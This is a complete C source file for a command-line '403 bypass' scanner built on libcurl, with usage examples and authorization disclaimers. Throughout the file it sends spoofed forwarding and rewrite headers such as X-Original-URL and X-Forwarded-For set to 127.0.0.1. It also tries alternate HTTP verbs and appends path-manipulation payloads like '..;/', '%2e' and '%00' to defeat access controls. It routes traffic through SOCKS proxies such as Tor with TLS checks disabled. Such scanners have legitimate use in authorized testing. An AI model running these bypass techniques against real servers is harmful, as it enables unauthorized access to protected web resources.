/*
 * Advanced 403 Bypass Testing Tool - Educational Purpose Only
 * Use only on systems you own or have written authorization to test
 * 
 * Compile: gcc -o 403bypass 403bypass.c -lcurl -lpthread -Wall -O2
 * Usage: ./403bypass -u <URL> [options]
 * 
 * Author: Security Research Tool
 * Version: 2.0
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <pthread.h>
#include <unistd.h>
#include <time.h>
#include <getopt.h>
#include <sys/time.h>

#define MAX_URL_LENGTH 2048
#define MAX_RESPONSE_SIZE 1048576
#define MAX_THREADS 10
#define VERSION "2.0"

// Color codes
#define COLOR_RED     "\x1b[31m"
#define COLOR_GREEN   "\x1b[32m"
#define COLOR_YELLOW  "\x1b[33m"
#define COLOR_BLUE    "\x1b[34m"
#define COLOR_MAGENTA "\x1b[35m"
#define COLOR_CYAN    "\x1b[36m"
#define COLOR_BOLD    "\x1b[1m"
#define COLOR_RESET   "\x1b[0m"

// Configuration structure
typedef struct {
    char url[MAX_URL_LENGTH];
    char proxy[256];
    char proxy_type[16];
    char cookie_file[256];
    char output_file[256];
    int rate_limit;  // requests per second
    int threads;
    int verbose;
    int json_output;
    int use_proxy;
    int use_cookies;
} Config;

// Response data structure
typedef struct {
    char *data;
    size_t size;
} ResponseData;

// Test result structure
typedef struct {
    char method[128];
    long status_code;
    size_t response_size;
    double time_taken;
    char notes[256];
} TestResult;

// Global variables
Config config = {0};
pthread_mutex_t print_mutex = PTHREAD_MUTEX_INITIALIZER;
pthread_mutex_t rate_limit_mutex = PTHREAD_MUTEX_INITIALIZER;
struct timeval last_request_time = {0};
FILE *output_fp = NULL;
int total_tests = 0;
int completed_tests = 0;

// Function prototypes
void print_banner(void);
void print_help(void);
void parse_arguments(int argc, char *argv[]);
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp);
void print_result(TestResult *result);
void print_json_result(TestResult *result, int is_last);
long make_request(const char *url, const char *method, struct curl_slist *headers, 
                  size_t *response_size, double *time_taken);
void rate_limit_wait(void);
void test_headers(const char *url, const char *path);
void test_methods(const char *url);
void test_path_manipulation(const char *url);
void extract_path(const char *url, char *path, size_t path_size);
void extract_base_url(const char *url, char *base_url, size_t base_size);
void get_baseline(const char *url);
void *thread_worker(void *arg);

// Print banner
void print_banner(void) {
    printf("\n%s%s", COLOR_CYAN, COLOR_BOLD);
    printf("╔════════════════════════════════════════════════════════════════════════════╗\n");
    printf("║                   403 Bypass Testing Tool v%s                          ║\n", VERSION);
    printf("║                     Educational Purpose Only                               ║\n");
    printf("║                  Use Only on Authorized Systems                            ║\n");
    printf("╚════════════════════════════════════════════════════════════════════════════╝\n");
    printf("%s\n", COLOR_RESET);
}

// Print help menu
void print_help(void) {
    print_banner();
    printf("%sUSAGE:%s\n", COLOR_BOLD, COLOR_RESET);
    printf("  ./403bypass -u <URL> [OPTIONS]\n\n");
    
    printf("%sREQUIRED:%s\n", COLOR_BOLD, COLOR_RESET);
    printf("  -u, --url <URL>              Target URL to test\n\n");
    
    printf("%sOPTIONS:%s\n", COLOR_BOLD, COLOR_RESET);
    printf("  -p, --proxy <proxy>          Proxy URL (e.g., socks5://127.0.0.1:9050)\n");
    printf("                               Supports: http://, https://, socks4://, socks5://\n");
    printf("  -c, --cookies <file>         Cookie jar file path\n");
    printf("  -o, --output <file>          Output results to file\n");
    printf("  -r, --rate-limit <num>       Rate limit: requests per second (default: unlimited)\n");
    printf("  -t, --threads <num>          Number of threads (1-%d, default: 1)\n", MAX_THREADS);
    printf("  -j, --json                   Output results in JSON format\n");
    printf("  -v, --verbose                Verbose output (show request/response details)\n");
    printf("  -h, --help                   Display this help menu\n");
    printf("  -V, --version                Show version information\n\n");
    
    printf("%sEXAMPLES:%s\n", COLOR_BOLD, COLOR_RESET);
    printf("  Basic scan:\n");
    printf("    ./403bypass -u https://example.com/admin\n\n");
    
    printf("  With SOCKS5 proxy:\n");
    printf("    ./403bypass -u https://example.com/admin -p socks5://127.0.0.1:9050\n\n");
    
    printf("  With rate limiting and threads:\n");
    printf("    ./403bypass -u https://example.com/admin -r 5 -t 3\n\n");
    
    printf("  With cookies and JSON output:\n");
    printf("    ./403bypass -u https://example.com/admin -c cookies.txt -j -o results.json\n\n");
    
    printf("  Full featured scan:\n");
    printf("    ./403bypass -u https://example.com/admin -p socks5://127.0.0.1:9050 \\\n");
    printf("                -c cookies.txt -r 10 -t 5 -j -o output.json -v\n\n");
    
    printf("%sNOTE:%s Always ensure you have explicit permission before testing any system.\n\n", 
           COLOR_YELLOW, COLOR_RESET);
}

// Parse command-line arguments
void parse_arguments(int argc, char *argv[]) {
    int opt;
    static struct option long_options[] = {
        {"url",         required_argument, 0, 'u'},
        {"proxy",       required_argument, 0, 'p'},
        {"cookies",     required_argument, 0, 'c'},
        {"output",      required_argument, 0, 'o'},
        {"rate-limit",  required_argument, 0, 'r'},
        {"threads",     required_argument, 0, 't'},
        {"json",        no_argument,       0, 'j'},
        {"verbose",     no_argument,       0, 'v'},
        {"help",        no_argument,       0, 'h'},
        {"version",     no_argument,       0, 'V'},
        {0, 0, 0, 0}
    };
    
    if (argc < 2) {
        print_help();
        exit(0);
    }
    
    while ((opt = getopt_long(argc, argv, "u:p:c:o:r:t:jvhV", long_options, NULL)) != -1) {
        switch (opt) {
            case 'u':
                strncpy(config.url, optarg, sizeof(config.url) - 1);
                break;
            case 'p':
                strncpy(config.proxy, optarg, sizeof(config.proxy) - 1);
                config.use_proxy = 1;
                // Determine proxy type
                if (strncmp(optarg, "socks5://", 9) == 0) {
                    strcpy(config.proxy_type, "socks5");
                } else if (strncmp(optarg, "socks4://", 9) == 0) {
                    strcpy(config.proxy_type, "socks4");
                } else {
                    strcpy(config.proxy_type, "http");
                }
                break;
            case 'c':
                strncpy(config.cookie_file, optarg, sizeof(config.cookie_file) - 1);
                config.use_cookies = 1;
                break;
            case 'o':
                strncpy(config.output_file, optarg, sizeof(config.output_file) - 1);
                break;
            case 'r':
                config.rate_limit = atoi(optarg);
                if (config.rate_limit < 0) config.rate_limit = 0;
                break;
            case 't':
                config.threads = atoi(optarg);
                if (config.threads < 1) config.threads = 1;
                if (config.threads > MAX_THREADS) config.threads = MAX_THREADS;
                break;
            case 'j':
                config.json_output = 1;
                break;
            case 'v':
                config.verbose = 1;
                break;
            case 'V':
                printf("403 Bypass Tool Version %s\n", VERSION);
                exit(0);
            case 'h':
            default:
                print_help();
                exit(0);
        }
    }
    
    // Validate required arguments
    if (strlen(config.url) == 0) {
        fprintf(stderr, "%sError: URL is required. Use -u or --url%s\n", COLOR_RED, COLOR_RESET);
        fprintf(stderr, "Try './403bypass --help' for more information.\n");
        exit(1);
    }
    
    // Add https:// if no protocol specified
    if (strstr(config.url, "://") == NULL) {
        char temp[MAX_URL_LENGTH];
        snprintf(temp, sizeof(temp), "https://%s", config.url);
        strncpy(config.url, temp, sizeof(config.url) - 1);
    }
    
    // Set default threads if not specified
    if (config.threads == 0) config.threads = 1;
}

// Callback function for writing response data
size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
    size_t realsize = size * nmemb;
    ResponseData *mem = (ResponseData *)userp;
    
    char *ptr = realloc(mem->data, mem->size + realsize + 1);
    if(ptr == NULL) {
        if (config.verbose) {
            fprintf(stderr, "Not enough memory!\n");
        }
        return 0;
    }
    
    mem->data = ptr;
    memcpy(&(mem->data[mem->size]), contents, realsize);
    mem->size += realsize;
    mem->data[mem->size] = 0;
    
    return realsize;
}

// Print result in human-readable format
void print_result(TestResult *result) {
    const char *color;
    if (result->status_code == 200) {
        color = COLOR_GREEN;
    } else if (result->status_code == 301 || result->status_code == 302) {
        color = COLOR_YELLOW;
    } else {
        color = COLOR_RED;
    }
    
    pthread_mutex_lock(&print_mutex);
    printf("%s[%ld] %-45s | Size: %-6zu | Time: %.2fs%s", 
           color, result->status_code, result->method, 
           result->response_size, result->time_taken, COLOR_RESET);
    
    if (strlen(result->notes) > 0) {
        printf(" | %s", result->notes);
    }
    printf("\n");
    
    if (output_fp && !config.json_output) {
        fprintf(output_fp, "[%ld] %-45s | Size: %-6zu | Time: %.2fs", 
                result->status_code, result->method, 
                result->response_size, result->time_taken);
        if (strlen(result->notes) > 0) {
            fprintf(output_fp, " | %s", result->notes);
        }
        fprintf(output_fp, "\n");
    }
    pthread_mutex_unlock(&print_mutex);
}

// Print result in JSON format
void print_json_result(TestResult *result, int is_last) {
    pthread_mutex_lock(&print_mutex);
    
    printf("    {\n");
    printf("      \"method\": \"%s\",\n", result->method);
    printf("      \"status_code\": %ld,\n", result->status_code);
    printf("      \"response_size\": %zu,\n", result->response_size);
    printf("      \"time_taken\": %.3f,\n", result->time_taken);
    printf("      \"notes\": \"%s\"\n", result->notes);
    printf("    }%s\n", is_last ? "" : ",");
    
    if (output_fp) {
        fprintf(output_fp, "    {\n");
        fprintf(output_fp, "      \"method\": \"%s\",\n", result->method);
        fprintf(output_fp, "      \"status_code\": %ld,\n", result->status_code);
        fprintf(output_fp, "      \"response_size\": %zu,\n", result->response_size);
        fprintf(output_fp, "      \"time_taken\": %.3f,\n", result->time_taken);
        fprintf(output_fp, "      \"notes\": \"%s\"\n", result->notes);
        fprintf(output_fp, "    }%s\n", is_last ? "" : ",");
    }
    
    pthread_mutex_unlock(&print_mutex);
}

// Rate limiting function
void rate_limit_wait(void) {
    if (config.rate_limit <= 0) return;
    
    pthread_mutex_lock(&rate_limit_mutex);
    
    struct timeval current_time;
    gettimeofday(&current_time, NULL);
    
    if (last_request_time.tv_sec != 0) {
        long elapsed_us = (current_time.tv_sec - last_request_time.tv_sec) * 1000000L +
                         (current_time.tv_usec - last_request_time.tv_usec);
        
        long required_delay_us = 1000000L / config.rate_limit;
        
        if (elapsed_us < required_delay_us) {
            usleep(required_delay_us - elapsed_us);
        }
    }
    
    gettimeofday(&last_request_time, NULL);
    pthread_mutex_unlock(&rate_limit_mutex);
}

// Make HTTP request with custom headers
long make_request(const char *url, const char *method, struct curl_slist *headers, 
                  size_t *response_size, double *time_taken) {
    CURL *curl;
    CURLcode res;
    long response_code = 0;
    ResponseData chunk = {0};
    struct timeval start_time, end_time;
    
    rate_limit_wait();
    
    chunk.data = malloc(1);
    chunk.size = 0;
    
    curl = curl_easy_init();
    if(curl) {
        gettimeofday(&start_time, NULL);
        
        curl_easy_setopt(curl, CURLOPT_URL, url);
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void *)&chunk);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
        
        // Proxy configuration
        if (config.use_proxy) {
            curl_easy_setopt(curl, CURLOPT_PROXY, config.proxy);
            if (strcmp(config.proxy_type, "socks5") == 0) {
                curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
            } else if (strcmp(config.proxy_type, "socks4") == 0) {
                curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS4);
            }
            
            if (config.verbose) {
                pthread_mutex_lock(&print_mutex);
                printf("%s[VERBOSE] Using proxy: %s (%s)%s\n", 
                       COLOR_BLUE, config.proxy, config.proxy_type, COLOR_RESET);
                pthread_mutex_unlock(&print_mutex);
            }
        }
        
        // Cookie jar
        if (config.use_cookies) {
            curl_easy_setopt(curl, CURLOPT_COOKIEFILE, config.cookie_file);
            curl_easy_setopt(curl, CURLOPT_COOKIEJAR, config.cookie_file);
        }
        
        if (headers) {
            curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
        }
        
        // Set custom method
        if (strcmp(method, "POST") == 0) {
            curl_easy_setopt(curl, CURLOPT_POST, 1L);
        } else if (strcmp(method, "HEAD") == 0) {
            curl_easy_setopt(curl, CURLOPT_NOBODY, 1L);
        } else if (strcmp(method, "GET") != 0) {
            curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, method);
        }
        
        // Verbose curl output
        if (config.verbose) {
            curl_easy_setopt(curl, CURLOPT_VERBOSE, 1L);
        }
        
        res = curl_easy_perform(curl);
        
        gettimeofday(&end_time, NULL);
        *time_taken = (end_time.tv_sec - start_time.tv_sec) + 
                     (end_time.tv_usec - start_time.tv_usec) / 1000000.0;
        
        if(res == CURLE_OK) {
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
            *response_size = chunk.size;
        } else {
            if (config.verbose) {
                pthread_mutex_lock(&print_mutex);
                fprintf(stderr, "%s[ERROR] curl_easy_perform() failed: %s%s\n", 
                        COLOR_RED, curl_easy_strerror(res), COLOR_RESET);
                pthread_mutex_unlock(&print_mutex);
            }
            response_code = 0;
        }
        
        curl_easy_cleanup(curl);
    }
    
    free(chunk.data);
    
    pthread_mutex_lock(&rate_limit_mutex);
    completed_tests++;
    pthread_mutex_unlock(&rate_limit_mutex);
    
    return response_code;
}

// Extract path from URL
void extract_path(const char *url, char *path, size_t path_size) {
    const char *path_start = strstr(url, "://");
    if (path_start) {
        path_start += 3;
        path_start = strchr(path_start, '/');
        if (path_start) {
            strncpy(path, path_start, path_size - 1);
            path[path_size - 1] = '\0';
            return;
        }
    }
    strncpy(path, "/", path_size - 1);
}

// Extract base URL
void extract_base_url(const char *url, char *base_url, size_t base_size) {
    const char *path_start = strstr(url, "://");
    if (path_start) {
        path_start += 3;
        const char *path = strchr(path_start, '/');
        if (path) {
            size_t len = path - url;
            if (len < base_size) {
                strncpy(base_url, url, len);
                base_url[len] = '\0';
                return;
            }
        }
    }
    strncpy(base_url, url, base_size - 1);
    base_url[base_size - 1] = '\0';
}

// Get baseline response
void get_baseline(const char *url) {
    if (!config.json_output) {
        printf("\n%s[*] Getting Baseline Response...%s\n", COLOR_YELLOW, COLOR_RESET);
    }
    
    size_t response_size = 0;
    double time_taken = 0;
    long status = make_request(url, "GET", NULL, &response_size, &time_taken);
    
    if (!config.json_output) {
        printf("%s[*] Baseline: Status=%ld | Size=%zu | Time=%.2fs%s\n\n", 
               COLOR_YELLOW, status, response_size, time_taken, COLOR_RESET);
    }
}

// Test various header manipulations
void test_headers(const char *url, const char *path) {
    if (!config.json_output) {
        printf("%s", COLOR_CYAN);
        printf("════════════════════════════════════════════════════════════════════════════\n");
        printf("[*] Testing Header Manipulations\n");
        printf("════════════════════════════════════════════════════════════════════════════\n");
        printf("%s", COLOR_RESET);
    }
    
    const char *header_tests[][2] = {
        {"X-Original-URL", path},
        {"X-Rewrite-URL", path},
        {"X-Custom-IP-Authorization", "127.0.0.1"},
        {"X-Forwarded-For", "127.0.0.1"},
        {"X-Forwarded-Host", "127.0.0.1"},
        {"X-Forwarded-Server", "127.0.0.1"},
        {"X-Originating-IP", "127.0.0.1"},
        {"X-Remote-IP", "127.0.0.1"},
        {"X-Client-IP", "127.0.0.1"},
        {"X-Host", "127.0.0.1"},
        {"X-ProxyUser-Ip", "127.0.0.1"},
        {"Forwarded", "for=127.0.0.1;by=127.0.0.1"},
        {"Referer", url},
        {"User-Agent", "Googlebot/2.1 (+http://www.google.com/bot.html)"},
        {"X-Real-IP", "127.0.0.1"},
        {"True-Client-IP", "127.0.0.1"},
        {"Cluster-Client-IP", "127.0.0.1"},
        {"X-ProxyUser-IP", "127.0.0.1"},
        {"Via", "1.1 127.0.0.1"},
        {NULL, NULL}
    };
    
    int count = 0;
    while (header_tests[count][0] != NULL) count++;
    
    for (int i = 0; header_tests[i][0] != NULL; i++) {
        struct curl_slist *headers = NULL;
        char header_line[512];
        snprintf(header_line, sizeof(header_line), "%s: %s", 
                 header_tests[i][0], header_tests[i][1]);
        headers = curl_slist_append(headers, header_line);
        
        size_t response_size = 0;
        double time_taken = 0;
        long status = make_request(url, "GET", headers, &response_size, &time_taken);
        
        TestResult result;
        snprintf(result.method, sizeof(result.method), "Header: %s", header_tests[i][0]);
        result.status_code = status;
        result.response_size = response_size;
        result.time_taken = time_taken;
        snprintf(result.notes, sizeof(result.notes), "%s", header_tests[i][1]);
        
        if (config.json_output) {
            print_json_result(&result, (i == count - 1));
        } else {
            print_result(&result);
        }
        
        curl_slist_free_all(headers);
    }
}

// Test different HTTP methods
void test_methods(const char *url) {
    if (!config.json_output) {
        printf("\n%s", COLOR_CYAN);
        printf("════════════════════════════════════════════════════════════════════════════\n");
        printf("[*] Testing HTTP Methods\n");
        printf("════════════════════════════════════════════════════════════════════════════\n");
        printf("%s", COLOR_RESET);
    }
    
    const char *methods[] = {
        "GET", "POST", "PUT", "DELETE", "PATCH", 
        "OPTIONS", "TRACE", "HEAD", "CONNECT", NULL
    };
    
    int count = 0;
    while (methods[count] != NULL) count++;
    
    for (int i = 0; methods[i] != NULL; i++) {
        size_t response_size = 0;
        double time_taken = 0;
        long status = make_request(url, methods[i], NULL, &response_size, &time_taken);
        
        TestResult result;
        snprintf(result.method, sizeof(result.method), "Method: %s", methods[i]);
        result.status_code = status;
        result.response_size = response_size;
        result.time_taken = time_taken;
        result.notes[0] = '\0';
        
        if (config.json_output) {
            print_json_result(&result, (i == count - 1));
        } else {
            print_result(&result);
        }
    }
}

// Test path manipulations
void test_path_manipulation(const char *url) {
    if (!config.json_output) {
        printf("\n%s", COLOR_CYAN);
        printf("════════════════════════════════════════════════════════════════════════════\n");
        printf("[*] Testing Path Manipulations\n");
        printf("════════════════════════════════════════════════════════════════════════════\n");
        printf("%s", COLOR_RESET);
    }
    
    char base_url[MAX_URL_LENGTH];
    char path[512];
    extract_base_url(url, base_url, sizeof(base_url));
    extract_path(url, path, sizeof(path));
    
    const char *path_suffixes[] = {
        "",
        "/",
        "/.",
        "/..",
        "//",
        "/*",
        "/%2e/",
        "/%252e/",
        "%20",
        "%09",
        "?",
        "??",
        "#",
        ";",
        "..;/",
        "/.;/",
        "/./",
        "/%00",
        "/%0d%0a",
        NULL
    };
    
    int count = 0;
    while (path_suffixes[count] != NULL) count++;
    
    for (int i = 0; path_suffixes[i] != NULL; i++) {
        char test_url[MAX_URL_LENGTH];
        snprintf(test_url, sizeof(test_url), "%s%s%s", base_url, path, path_suffixes[i]);
        
        size_t response_size = 0;
        double time_taken = 0;
        long status = make_request(test_url, "GET", NULL, &response_size, &time_taken);
        
        TestResult result;
        snprintf(result.method, sizeof(result.method), "Path: %s%s", path, path_suffixes[i]);
        result.status_code = status;
        result.response_size = response_size;
        result.time_taken = time_taken;
        result.notes[0] = '\0';
        
        if (config.json_output) {
            print_json_result(&result, (i == count - 1));
        } else {
            print_result(&result);
        }
    }
}

// Thread worker function (for future multi-threaded implementation)
void *thread_worker(void *arg) {
    // This can be expanded for parallel testing
    return NULL;
}

// Main function
int main(int argc, char *argv[]) {
    // Parse command-line arguments
    parse_arguments(argc, argv);
    
    // Print banner
    if (!config.json_output) {
        print_banner();
        
        printf("%s⚠️  WARNING:%s Use only on systems you own or have permission to test!\n", 
               COLOR_RED, COLOR_RESET);
        printf("Unauthorized testing may be illegal in your jurisdiction.\n\n");
        
        printf("%sCONFIGURATION:%s\n", COLOR_BOLD, COLOR_RESET);
        printf("  Target URL:    %s\n", config.url);
        if (config.use_proxy) {
            printf("  Proxy:         %s (%s)\n", config.proxy, config.proxy_type);
        }
        if (config.use_cookies) {
            printf("  Cookie File:   %s\n", config.cookie_file);
        }
        if (strlen(config.output_file) > 0) {
            printf("  Output File:   %s\n", config.output_file);
        }
        if (config.rate_limit > 0) {
            printf("  Rate Limit:    %d req/s\n", config.rate_limit);
        }
        printf("  Threads:       %d\n", config.threads);
        printf("  JSON Output:   %s\n", config.json_output ? "Yes" : "No");
        printf("  Verbose:       %s\n", config.verbose ? "Yes" : "No");
    }
    
    // Open output file if specified
    if (strlen(config.output_file) > 0) {
        output_fp = fopen(config.output_file, "w");
        if (!output_fp) {
            fprintf(stderr, "%s[ERROR] Cannot open output file: %s%s\n", 
                    COLOR_RED, config.output_file, COLOR_RESET);
            return 1;
        }
    }
    
    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_ALL);
    
    // Extract path for header tests
    char path[512];
    extract_path(config.url, path, sizeof(path));
    
    // JSON output start
    if (config.json_output) {
        printf("{\n");
        printf("  \"target\": \"%s\",\n", config.url);
        printf("  \"timestamp\": %ld,\n", time(NULL));
        printf("  \"results\": [\n");
        
        if (output_fp) {
            fprintf(output_fp, "{\n");
            fprintf(output_fp, "  \"target\": \"%s\",\n", config.url);
            fprintf(output_fp, "  \"timestamp\": %ld,\n", time(NULL));
            fprintf(output_fp, "  \"results\": [\n");
        }
    }
    
    // Run tests
    get_baseline(config.url);
    test_headers(config.url, path);
    test_methods(config.url);
    test_path_manipulation(config.url);
    
    // JSON output end
    if (config.json_output) {
        printf("  ]\n");
        printf("}\n");
        
        if (output_fp) {
            fprintf(output_fp, "  ]\n");
            fprintf(output_fp, "}\n");
        }
    } else {
        printf("\n%s", COLOR_MAGENTA);
        printf("════════════════════════════════════════════════════════════════════════════\n");
        printf("[✓] Testing Complete! Total tests: %d\n", completed_tests);
        printf("════════════════════════════════════════════════════════════════════════════\n");
        printf("%s\n", COLOR_RESET);
    }
    
    // Cleanup
    if (output_fp) {
        fclose(output_fp);
        if (!config.json_output) {
            printf("%s[*] Results saved to: %s%s\n", COLOR_GREEN, config.output_file, COLOR_RESET);
        }
    }
    
    curl_global_cleanup();
    
    return 0;
}
